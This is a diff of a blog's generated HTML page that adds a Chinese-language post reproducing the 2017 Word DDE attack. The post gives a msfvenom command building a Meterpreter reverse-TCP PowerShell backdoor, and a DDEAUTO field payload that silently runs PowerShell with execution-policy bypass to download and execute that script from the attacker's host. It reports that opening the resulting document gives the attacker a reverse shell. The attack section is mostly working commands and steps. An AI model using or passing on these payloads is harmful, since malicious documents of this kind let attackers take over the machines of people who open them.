@@ -6,17 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="www.xnianq.cn">
-  <title>Archives: 2017/4 | xnianq&#39;blog</title>
+  <title>DDE word0day复现 | xnianq&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="More Code,less talk!">
-<meta property="og:type" content="website">
-<meta property="og:title" content="xnianq&#39;blog">
-<meta property="og:url" content="www.xnianq.cn/archives/2017/04/index.html">
+  <meta name="description" content="这一段时间office 0day爆出来很多，CVE-2017-0199还有以及其他的变种，之前的在实战过程中已经见到了它的威力，杀毒软件也基本上会对嵌入对象做查杀。前天看到了这一个0day，于是复现了一下，复现过程很简单。 环境 windows10 专业版 kali 2016.2 &amp;amp; msf  复现过程首先做好预备工作，我当前kali机器上的ip为：10.211.55.8,使用以下命令产生">
+<meta name="keywords" content="pentest">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDE word0day复现">
+<meta property="og:url" content="www.xnianq.cn/2017/10/14/DDE-word0day复现/index.html">
 <meta property="og:site_name" content="xnianq&#39;blog">
-<meta property="og:description" content="More Code,less talk!">
+<meta property="og:description" content="这一段时间office 0day爆出来很多，CVE-2017-0199还有以及其他的变种，之前的在实战过程中已经见到了它的威力，杀毒软件也基本上会对嵌入对象做查杀。前天看到了这一个0day，于是复现了一下，复现过程很简单。 环境 windows10 专业版 kali 2016.2 &amp;amp; msf  复现过程首先做好预备工作，我当前kali机器上的ip为：10.211.55.8,使用以下命令产生">
+<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/doc1.png">
+<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/doc2.png">
+<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/doc3.png">
+<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/doc4.png">
+<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/doc5.png">
+<meta property="og:updated_time" content="2017-10-14T05:06:48.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xnianq&#39;blog">
-<meta name="twitter:description" content="More Code,less talk!">
+<meta name="twitter:title" content="DDE word0day复现">
+<meta name="twitter:description" content="这一段时间office 0day爆出来很多，CVE-2017-0199还有以及其他的变种，之前的在实战过程中已经见到了它的威力，杀毒软件也基本上会对嵌入对象做查杀。前天看到了这一个0day，于是复现了一下，复现过程很简单。 环境 windows10 专业版 kali 2016.2 &amp;amp; msf  复现过程首先做好预备工作，我当前kali机器上的ip为：10.211.55.8,使用以下命令产生">
+<meta name="twitter:image" content="http://ofutja06x.bkt.clouddn.com/doc1.png">
   
     <link rel="alternative" href="/atom.xml" title="xnianq&#39;blog" type="application/atom+xml">
   
@@ -152,64 +160,186 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="title-DDE-word0day复现" class="article article-type-title " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-title">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/04/07/sql盲注笔记/" class="archive-article-date">
-  	<time datetime="2017-04-07T06:47:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-07</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/04/07/sql盲注笔记/">sql盲注笔记</a>
+    <h1 class="article-title" itemprop="name">
+      DDE word0day复现
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2017/10/14/DDE-word0day复现/" class="archive-article-date">
+  	<time datetime="2017-10-14T04:26:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这一段时间office 0day爆出来很多，CVE-2017-0199还有以及其他的变种，之前的在实战过程中已经见到了它的威力，杀毒软件也基本上会对嵌入对象做查杀。前天看到了这一个0day，于是复现了一下，复现过程很简单。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
+<li>windows10 专业版</li>
+<li>kali 2016.2 &amp; msf</li>
+</ul>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>首先做好预备工作，我当前kali机器上的ip为：10.211.55.8,使用以下命令产生ps1后门：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom  -p   windows/x64/meterpreter/reverse_tcp  lhost=<span class="number">10.211</span><span class="number">.55</span><span class="number">.8</span>   lport=<span class="number">12345</span>  -f  psh-reflection &gt;/root/search.ps1</div></pre></td></tr></table></figure></p>
+<p>启动一个http服务，将产生的ps1后门放在web服务上传输。<br>然后启动msf，监听12345端口，等待目标打开后门文档。</p>
+<p>接下来步骤就是制作后门文档了：<br>新建一个word空白文档，插入-&gt;文档部件-&gt;域<br><img src="http://ofutja06x.bkt.clouddn.com/doc1.png" alt=""><br>然后添加公式：<br><img src="http://ofutja06x.bkt.clouddn.com/doc2.png" alt=""><br>之后对这一公式进行操作：<br><img src="http://ofutja06x.bkt.clouddn.com/doc3.png" alt=""><br>payload内容如下：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;DDEAUTO c:\\Windows\\System32\\<span class="keyword">cmd</span>.<span class="bash">exe      <span class="string">"/c powershell.exe -windowstyle hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(' http://10.211.55.8:8080/search.ps1');test.ps1 "</span> &#125;</span></div></pre></td></tr></table></figure>
+<p>这一payload会在攻击机kali上下载产生的后门ps1文件，然后执行后门程序。<br>然后保存word文档，再次打开，就可以看到已经成功反弹回了shell。<br><img src="http://ofutja06x.bkt.clouddn.com/doc4.png" alt=""><br><img src="http://ofutja06x.bkt.clouddn.com/doc5.png" alt=""></p>
+<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>虽然在ps1脚本情况下已经复现成功，但是我的本意是直接执行生成的powershell，无需对外进行通信，但是并没有复现成功，可能字段长度太长，或者是其他原因，昨天弄了一天，没有搞明白是什么原因，于是就试了试ps1脚本，配合msf。(我的本意是用empire或者cs……)</p>
+<p>如果大佬们有看到这篇文章，然后直接执行powershell成功的，可以一起交流下。</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://ofutja06x.bkt.clouddn.com/zfb.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://ofutja06x.bkt.clouddn.com/wx.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">sqli</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">pentest</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http:www.xnianq.cn/2017/10/14/DDE-word0day复现/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2017/08/02/逆向学习01-一道简单的逆向题目/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">逆向学习01-一道简单的逆向题目</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
 
 
           </div>
@@ -232,8 +362,8 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
